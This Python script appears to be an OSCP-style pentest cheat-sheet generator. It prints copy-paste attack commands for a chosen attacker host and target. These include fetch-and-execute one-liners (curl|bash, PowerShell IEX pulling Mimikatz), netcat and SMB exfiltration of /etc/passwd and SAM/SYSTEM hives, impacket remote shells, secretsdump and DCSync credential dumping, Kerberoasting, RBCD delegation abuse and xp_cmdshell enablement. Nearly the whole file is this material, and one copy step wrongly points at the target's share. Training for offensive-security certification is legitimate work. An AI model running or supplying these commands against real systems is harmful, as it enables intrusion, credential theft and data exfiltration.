#!/usr/bin/env python3
"""
SMB & File Transfer Command Generator — OSCP Edition
Generates copy-paste-ready commands for file sharing and impacket SMB ops.

Usage:
  python3 smb_tools.py
  python3 smb_tools.py --lhost 192.168.45.5 --target 10.10.10.10
"""

import argparse
import sys
import os

# Colors
R = "\033[0;31m"; G = "\033[0;32m"; C = "\033[0;36m"; Y = "\033[1;33m"
B = "\033[1m"; N = "\033[0m"

def banner():
    print(f"""{B}{C}
╔══════════════════════════════════════════════════════╗
║  SMB & File Transfer Toolkit — OSCP Edition          ║
╚══════════════════════════════════════════════════════╝{N}""")

def section(title):
    print(f"\n{B}{C}{'═'*55}")
    print(f"  {title}")
    print(f"{'═'*55}{N}")

def cmd(c):
    print(f"  {G}${N} {c}")

def note(n):
    print(f"  {Y}# {n}{N}")

# ─────────────────────────────────────────────────────
#  FILE TRANSFER COMMANDS
# ─────────────────────────────────────────────────────

def file_transfer_linux(lhost, lport="80"):
    section("File Transfer → Linux Target")

    note("Start HTTP server on Kali")
    cmd(f"python3 -m http.server {lport}")
    print()

    note("Download on target")
    cmd(f"wget http://{lhost}:{lport}/linpeas.sh -O /tmp/linpeas.sh")
    cmd(f"curl http://{lhost}:{lport}/linpeas.sh -o /tmp/linpeas.sh")
    cmd(f"busybox wget http://{lhost}:{lport}/shell.elf -O /tmp/shell.elf")
    print()

    note("Fetch + execute in memory (no file on disk)")
    cmd(f"curl http://{lhost}:{lport}/linpeas.sh | bash")
    cmd(f"wget -qO- http://{lhost}:{lport}/linpeas.sh | bash")
    print()

    note("Base64 transfer (bypass AV/filters)")
    cmd("base64 -w 0 file.bin > file.b64          # on Kali")
    cmd("base64 -d file.b64 > file.bin             # on target")
    print()

    note("Netcat transfer")
    cmd(f"nc -lvnp 9001 > received_file             # Kali listener")
    cmd(f"nc {lhost} 9001 < /etc/passwd             # target sends file")
    print()
    cmd(f"nc -lvnp 9001 < linpeas.sh                # Kali serves file")
    cmd(f"nc {lhost} 9001 > /tmp/linpeas.sh         # target receives")
    print()

    note("SCP (if you have SSH creds)")
    cmd(f"scp linpeas.sh user@TARGET:/tmp/")
    cmd(f"scp user@TARGET:/etc/passwd ./loot/")
    print()

    note("/dev/tcp download (no curl/wget)")
    cmd(f"exec 3<>/dev/tcp/{lhost}/{lport}; echo -e 'GET /shell.elf HTTP/1.0\\r\\nHost: {lhost}\\r\\n\\r\\n' >&3; cat <&3 > shell.elf")


def file_transfer_windows(lhost, lport="80"):
    section("File Transfer → Windows Target")

    note("Start HTTP server on Kali")
    cmd(f"python3 -m http.server {lport}")
    print()

    note("certutil (most reliable)")
    cmd(f"certutil -urlcache -f http://{lhost}:{lport}/shell.exe C:\\TEMP\\shell.exe")
    cmd(f"certutil -urlcache -f http://{lhost}:{lport}/nc.exe C:\\TEMP\\nc.exe")
    print()

    note("PowerShell Invoke-WebRequest")
    cmd(f"powershell iwr -uri http://{lhost}:{lport}/shell.exe -outfile C:\\TEMP\\shell.exe")
    cmd(f"powershell (New-Object Net.WebClient).DownloadFile('http://{lhost}:{lport}/shell.exe','C:\\TEMP\\shell.exe')")
    print()

    note("PowerShell download + execute in memory")
    cmd(f"powershell IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/PowerView.ps1')")
    cmd(f"powershell IEX(iwr http://{lhost}:{lport}/Invoke-Mimikatz.ps1 -UseBasicParsing)")
    print()

    note("curl (Windows 10+)")
    cmd(f"curl http://{lhost}:{lport}/shell.exe -o C:\\TEMP\\shell.exe")
    print()

    note("Bitsadmin")
    cmd(f"bitsadmin /transfer job /download /priority high http://{lhost}:{lport}/shell.exe C:\\TEMP\\shell.exe")
    print()

    note("Base64 PowerShell (bypass filters)")
    cmd("cat shell.exe | base64 -w 0 > shell.b64   # on Kali")
    cmd("powershell [IO.File]::WriteAllBytes('C:\\TEMP\\shell.exe', [Convert]::FromBase64String((Get-Content C:\\TEMP\\shell.b64)))")


def file_transfer_smb_share(lhost):
    section("SMB File Sharing (impacket-smbserver)")

    note("Start SMB share on Kali (anonymous)")
    cmd(f"impacket-smbserver share $(pwd) -smb2support")
    print()

    note("Start SMB share with credentials (for Windows 10+)")
    cmd(f"impacket-smbserver share $(pwd) -smb2support -username kali -password kali")
    print()

    note("On Windows target — copy FROM Kali")
    cmd(f"copy \\\\{lhost}\\share\\shell.exe C:\\TEMP\\shell.exe")
    cmd(f"xcopy \\\\{lhost}\\share\\mimikatz.exe C:\\TEMP\\")
    print()

    note("On Windows target — copy TO Kali (exfil)")
    cmd(f"copy C:\\Users\\Administrator\\Desktop\\proof.txt \\\\{lhost}\\share\\")
    cmd(f"copy C:\\TEMP\\SAM \\\\{lhost}\\share\\")
    cmd(f"copy C:\\TEMP\\SYSTEM \\\\{lhost}\\share\\")
    print()

    note("Mount SMB share with creds (Windows 10+ requires auth)")
    cmd(f"net use Z: \\\\{lhost}\\share /user:kali kali")
    cmd("copy Z:\\shell.exe C:\\TEMP\\")
    cmd(f"net use Z: /delete")
    print()

    note("PowerShell copy from SMB")
    cmd(f"Copy-Item \\\\{lhost}\\share\\shell.exe C:\\TEMP\\shell.exe")


# ─────────────────────────────────────────────────────
#  IMPACKET SMB COMMANDS
# ─────────────────────────────────────────────────────

def impacket_enum(target, domain="", user="", password="", hashes=""):
    section("Impacket SMB Enumeration")
    cred = _build_cred(domain, user, password, hashes)

    note("smbclient — list/browse shares")
    cmd(f"impacket-smbclient {cred}@{target}")
    print()

    note("Null session")
    cmd(f"smbclient -N -L //{target}/")
    cmd(f"enum4linux-ng -A {target}")
    print()

    note("With creds — list shares")
    if user and password:
        cmd(f"smbclient -U '{user}%{password}' -L //{target}/")
    else:
        cmd(f"smbclient -U 'USER%PASS' -L //{target}/")
    print()

    note("Download everything from a share")
    if user and password:
        cmd(f"smbclient -U '{user}%{password}' //{target}/SHARENAME -c 'recurse ON; prompt OFF; mget *'")
    else:
        cmd(f"smbclient -U 'USER%PASS' //{target}/SHARENAME -c 'recurse ON; prompt OFF; mget *'")
    print()

    note("netexec share enum + spider")
    if user and password:
        d = f"-d {domain} " if domain else ""
        cmd(f"netexec smb {target} -u '{user}' -p '{password}' {d}--shares")
        cmd(f"netexec smb {target} -u '{user}' -p '{password}' {d}-M spider_plus")
        cmd(f"netexec smb {target} -u '{user}' -p '{password}' {d}--rid-brute")
    elif hashes:
        cmd(f"netexec smb {target} -u '{user}' -H '{hashes}' --shares")
    else:
        cmd(f"netexec smb {target} -u 'USER' -p 'PASS' --shares")
        cmd(f"netexec smb {target} -u 'USER' -p 'PASS' -M spider_plus")


def impacket_exec(target, domain="", user="", password="", hashes=""):
    section("Impacket Remote Execution")
    cred = _build_cred(domain, user, password, hashes)
    hash_flag = f" -hashes :{hashes}" if hashes else ""

    note("psexec — SYSTEM shell (writes to disk, noisy)")
    cmd(f"impacket-psexec {cred}@{target}{hash_flag}")
    print()

    note("wmiexec — user-level shell (stealthier)")
    cmd(f"impacket-wmiexec {cred}@{target}{hash_flag}")
    print()

    note("smbexec — semi-interactive (uses SMB)")
    cmd(f"impacket-smbexec {cred}@{target}{hash_flag}")
    print()

    note("atexec — execute via scheduled task")
    cmd(f"impacket-atexec {cred}@{target}{hash_flag} 'whoami'")
    print()

    note("evil-winrm (needs port 5985 open)")
    if hashes:
        cmd(f"evil-winrm -i {target} -u '{user}' -H '{hashes}'")
    elif password:
        cmd(f"evil-winrm -i {target} -u '{user}' -p '{password}'")
    else:
        cmd(f"evil-winrm -i {target} -u 'USER' -p 'PASS'")
    print()

    note("Through pivot (proxychains)")
    if hashes:
        cmd(f"proxychains impacket-psexec {cred}@{target}{hash_flag}")
        cmd(f"proxychains evil-winrm -i {target} -u '{user}' -H '{hashes}'")
    else:
        cmd(f"proxychains impacket-psexec {cred}@{target}")
        cmd(f"proxychains evil-winrm -i {target} -u '{user}' -p '{password or 'PASS'}'")


def impacket_secrets(target, domain="", user="", password="", hashes=""):
    section("Impacket Credential Dumping")
    cred = _build_cred(domain, user, password, hashes)
    hash_flag = f" -hashes :{hashes}" if hashes else ""

    note("secretsdump — DCSync / SAM dump (the money shot)")
    cmd(f"impacket-secretsdump {cred}@{target}{hash_flag}")
    print()

    note("Just grab Administrator hash")
    cmd(f"impacket-secretsdump {cred}@{target}{hash_flag} -just-dc-user Administrator")
    print()

    note("Offline SAM/SYSTEM dump")
    cmd("impacket-secretsdump -sam SAM -system SYSTEM LOCAL")
    print()

    note("Grab SAM + SYSTEM from target first")
    cmd("reg save HKLM\\SAM C:\\TEMP\\SAM")
    cmd("reg save HKLM\\SYSTEM C:\\TEMP\\SYSTEM")
    cmd(f"copy C:\\TEMP\\SAM \\\\{target}\\share\\")
    cmd(f"copy C:\\TEMP\\SYSTEM \\\\{target}\\share\\")


def impacket_kerberos(target, domain="", user="", password="", hashes=""):
    section("Impacket Kerberos Attacks")
    d = domain or "DOMAIN.LOCAL"
    u = user or "USER"
    p = password or "PASS"

    note("Kerberoasting — extract service account hashes")
    cmd(f"impacket-GetUserSPNs '{d}/{u}:{p}' -dc-ip {target} -request -outputfile kerb.hash")
    cmd("hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt")
    print()

    note("AS-REP Roasting — no preauth accounts")
    cmd(f"impacket-GetNPUsers '{d}/' -usersfile users.txt -no-pass -dc-ip {target} -outputfile asrep.hash")
    cmd("hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt")
    print()

    note("Request TGT")
    cmd(f"impacket-getTGT '{d}/{u}:{p}' -dc-ip {target}")
    cmd(f"export KRB5CCNAME={u}.ccache")
    print()

    note("S4U — Constrained Delegation")
    cmd(f"impacket-getST -spn 'cifs/{target}' -impersonate Administrator '{d}/{u}:{p}' -dc-ip {target}")
    cmd("export KRB5CCNAME=Administrator.ccache")
    cmd(f"impacket-psexec -k -no-pass '{d}/Administrator@{target}'")


def impacket_rbcd(target, domain="", user="", password="", hashes=""):
    section("Impacket RBCD Attack")
    d = domain or "DOMAIN.LOCAL"
    u = user or "USER"
    p = password or "PASS"
    cred = f"{d}/{u}:{p}"

    note("Step 1: Create fake machine account")
    cmd(f"impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Password1' '{cred}' -dc-ip {target}")
    print()

    note("Step 2: Set RBCD delegation")
    cmd(f"impacket-rbcd '{cred}' -action write -delegate-to 'TARGET_COMPUTER$' -delegate-from 'EVIL$' -dc-ip {target}")
    print()

    note("Step 3: Get impersonation ticket")
    cmd(f"impacket-getST -spn 'cifs/TARGET.{d}' -impersonate Administrator '{d}/EVIL$:Password1' -dc-ip {target}")
    print()

    note("Step 4: Use it")
    cmd("export KRB5CCNAME=Administrator.ccache")
    cmd(f"impacket-psexec -k -no-pass 'TARGET.{d}'")


def impacket_mssql(target, domain="", user="", password="", hashes=""):
    section("Impacket MSSQL")
    cred = _build_cred(domain, user, password, hashes)

    note("Connect to MSSQL")
    cmd(f"impacket-mssqlclient {cred}@{target} -windows-auth")
    print()

    note("Once connected — useful commands")
    cmd("SELECT name FROM sys.databases;")
    cmd("SELECT * FROM master.sys.server_principals;")
    print()

    note("Check impersonation → xp_cmdshell")
    cmd("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';")
    cmd("EXECUTE AS LOGIN = 'sa';")
    cmd("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
    cmd("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")
    cmd("EXEC xp_cmdshell 'whoami';")


def impacket_dacl(target, domain="", user="", password="", hashes=""):
    section("Impacket ACL Abuse")
    d = domain or "DOMAIN.LOCAL"
    u = user or "USER"
    p = password or "PASS"

    note("Grant DCSync rights (WriteDACL)")
    cmd(f"impacket-dacledit -action write -rights DCSync -principal '{u}' -target-dn 'DC={d.split('.')[0]},DC={d.split('.')[-1]}' '{d}/{u}:{p}'")
    print()
    note("Then DCSync")
    cmd(f"impacket-secretsdump '{d}/{u}:{p}'@{target}")


# ─────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────

def _build_cred(domain, user, password, hashes):
    d = domain or "WORKGROUP"
    u = user or "Administrator"
    if hashes:
        return f"'{d}/{u}'"
    p = password or "PASS"
    return f"'{d}/{u}:{p}'"


def interactive_menu(lhost, target):
    while True:
        print(f"\n{B}{'─'*55}{N}")
        print(f"  {B}LHOST:{N} {lhost}    {B}TARGET:{N} {target}")
        print(f"{B}{'─'*55}{N}")
        print(f"""
  {B}File Transfer{N}
    1)  Transfer to Linux target
    2)  Transfer to Windows target
    3)  SMB file sharing (impacket-smbserver)

  {B}Impacket SMB{N}
    4)  SMB enumeration (shares, null session, spider)
    5)  Remote execution (psexec, wmiexec, evil-winrm)
    6)  Credential dumping (secretsdump, SAM)
    7)  Kerberos attacks (Kerberoast, AS-REP, S4U)
    8)  RBCD attack chain
    9)  MSSQL commands
   10)  ACL abuse (dacledit)

  {B}Print All{N}
    0)  Everything

    q)  Quit
""")
        choice = input(f"  {C}Choice:{N} ").strip().lower()

        domain = user = password = hashes = ""

        if choice in ["4","5","6","7","8","9","10","0"]:
            print(f"\n  {Y}Credentials (press Enter to skip):{N}")
            domain   = input(f"  Domain [{Y}WORKGROUP{N}]: ").strip()
            user     = input(f"  Username [{Y}Administrator{N}]: ").strip()
            password = input(f"  Password: ").strip()
            if not password:
                hashes = input(f"  NTLM Hash: ").strip()

        if choice == "1":
            file_transfer_linux(lhost)
        elif choice == "2":
            file_transfer_windows(lhost)
        elif choice == "3":
            file_transfer_smb_share(lhost)
        elif choice == "4":
            impacket_enum(target, domain, user, password, hashes)
        elif choice == "5":
            impacket_exec(target, domain, user, password, hashes)
        elif choice == "6":
            impacket_secrets(target, domain, user, password, hashes)
        elif choice == "7":
            impacket_kerberos(target, domain, user, password, hashes)
        elif choice == "8":
            impacket_rbcd(target, domain, user, password, hashes)
        elif choice == "9":
            impacket_mssql(target, domain, user, password, hashes)
        elif choice == "10":
            impacket_dacl(target, domain, user, password, hashes)
        elif choice == "0":
            file_transfer_linux(lhost)
            file_transfer_windows(lhost)
            file_transfer_smb_share(lhost)
            impacket_enum(target, domain, user, password, hashes)
            impacket_exec(target, domain, user, password, hashes)
            impacket_secrets(target, domain, user, password, hashes)
            impacket_kerberos(target, domain, user, password, hashes)
            impacket_rbcd(target, domain, user, password, hashes)
            impacket_mssql(target, domain, user, password, hashes)
            impacket_dacl(target, domain, user, password, hashes)
        elif choice == "q":
            print(f"\n{G}Happy hacking!{N}\n")
            sys.exit(0)
        else:
            print(f"  {R}Invalid choice{N}")


# ─────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="SMB & File Transfer Command Generator — OSCP Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 smb_tools.py                                    # interactive
  python3 smb_tools.py --lhost 192.168.45.5 --target 10.10.10.10
  python3 smb_tools.py -l 192.168.45.5 -t 10.10.10.10 -u admin -p 'P@ss' -d corp.local
  python3 smb_tools.py -l 192.168.45.5 -t 10.10.10.10 --section transfer-linux
  python3 smb_tools.py -l 192.168.45.5 -t 10.10.10.10 --section all
        """
    )
    parser.add_argument("-l", "--lhost", help="Your Kali IP")
    parser.add_argument("-t", "--target", help="Target IP")
    parser.add_argument("-d", "--domain", default="", help="AD domain")
    parser.add_argument("-u", "--user", default="", help="Username")
    parser.add_argument("-p", "--password", default="", help="Password")
    parser.add_argument("-H", "--hashes", default="", help="NTLM hash")
    parser.add_argument("-s", "--section", default="",
                        choices=["transfer-linux","transfer-windows","smb-share",
                                 "enum","exec","secrets","kerberos","rbcd","mssql","dacl","all",""],
                        help="Print a specific section and exit")

    args = parser.parse_args()

    banner()

    lhost  = args.lhost  or input(f"  {C}Your Kali IP (LHOST):{N} ").strip()
    target = args.target or input(f"  {C}Target IP:{N} ").strip()

    if not lhost or not target:
        print(f"  {R}Both LHOST and TARGET are required.{N}")
        sys.exit(1)

    # Direct section mode
    if args.section:
        s = args.section
        d, u, p, h = args.domain, args.user, args.password, args.hashes
        if s == "transfer-linux":    file_transfer_linux(lhost)
        elif s == "transfer-windows": file_transfer_windows(lhost)
        elif s == "smb-share":       file_transfer_smb_share(lhost)
        elif s == "enum":            impacket_enum(target, d, u, p, h)
        elif s == "exec":            impacket_exec(target, d, u, p, h)
        elif s == "secrets":         impacket_secrets(target, d, u, p, h)
        elif s == "kerberos":        impacket_kerberos(target, d, u, p, h)
        elif s == "rbcd":            impacket_rbcd(target, d, u, p, h)
        elif s == "mssql":           impacket_mssql(target, d, u, p, h)
        elif s == "dacl":            impacket_dacl(target, d, u, p, h)
        elif s == "all":
            file_transfer_linux(lhost)
            file_transfer_windows(lhost)
            file_transfer_smb_share(lhost)
            impacket_enum(target, d, u, p, h)
            impacket_exec(target, d, u, p, h)
            impacket_secrets(target, d, u, p, h)
            impacket_kerberos(target, d, u, p, h)
            impacket_rbcd(target, d, u, p, h)
            impacket_mssql(target, d, u, p, h)
            impacket_dacl(target, d, u, p, h)
        return

    # Interactive menu
    interactive_menu(lhost, target)


if __name__ == "__main__":
    main()
